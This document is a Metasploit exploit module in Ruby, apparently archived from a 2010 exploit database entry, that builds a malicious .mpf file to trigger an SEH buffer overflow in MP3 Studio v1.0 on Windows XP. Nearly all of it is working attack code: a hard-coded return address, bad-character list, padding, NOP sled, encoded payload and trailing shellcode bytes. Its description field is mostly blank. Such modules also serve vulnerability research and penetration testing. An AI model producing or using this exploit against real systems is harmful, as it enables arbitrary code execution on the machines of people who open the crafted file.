#####################################################################  
# Title: MP3 Studio v1.0 (mpf File) Local BOF Exploit (SEH) Meta
# CVE-ID: () 
# OSVDB-ID: () 
# Author: sid3^effects
# Published: 2010-06-03
#####################################################################


## This file is part of the Metasploit Framework and may be subject to  

## redistribution and commercial restrictions. Please see the Metasploit  

## Framework web site for more information on licensing and terms of use.  

## http://metasploit.com/framework/  

###  

   

require 'msf/core' 

   

class Metasploit3 < Msf::Exploit::Remote  

    Rank = GreatRanking  

   

    include Msf::Exploit::FILEFORMAT 

   

    def initialize(info = {})  

        super(update_info(info,  

            'Name'           => 'MP3 Studio v1.0 (mpf File) Local BOF Exploit (SEH) META',  

            'Description'    => %q{  

                  

                    

                    to execute arbitrary code.  

            },  

            'License'        => MSF_LICENSE,  

            'Author'         => [ 'sid3^effects aKa HaRi' ],  

            'Version'        => 'Version 1.0',  

            'References'     =>  

                [  

                    [ 'URL', 'http://www.exploit-db.com/exploits/9291' ],  

                ],  

            'DefaultOptions' =>  

                {  

                    'EXITFUNC' => 'seh',  

                },  

            'Payload'        =>  

                {  

                    'Space'    => 986,  

                    'BadChars' => "\x00\x1a\x0a\x0d",  

                    'StackAdjustment' => -3500,  

                },  

            'Platform' => 'win',  

            'Targets'        =>  

                [  

                    [ 'Windows XP Universal', { 'Ret' => 0x7c96bf33 } ], #  

JMP ESP in ULMigration_us.dll  

                ],  

            'Privileged'     => false,  

             
            'DefaultTarget'  => 0))  

   

            register_options(  

                [  

                    OptString.new('FILENAME',   [ false, 'The file name.',  

'msf.mpf']),  

                ], self.class)  

   

    end 

   

    def exploit  

   

        sploit =  "\x3f\x5e\x03\x10" 

        sploit << "\xeb\xf1\x90\x90" 

        sploit << "\xfd\x61\x03\x10" 

        sploit << rand_text_alpha_upper(4103)  

        sploit << [target.ret].pack('V')  

        sploit << make_nops(10)  

        sploit << payload.encoded  

        sploit << "\x33\xc0\x33\x45\xf8\x04\x05\xff\xe0" 

   


        mpf = sploit  

   

        print_status("Creating '#{datastore['FILENAME']}' file ...")  

   

        file_create(mpf)  

   

    end 

   

end 

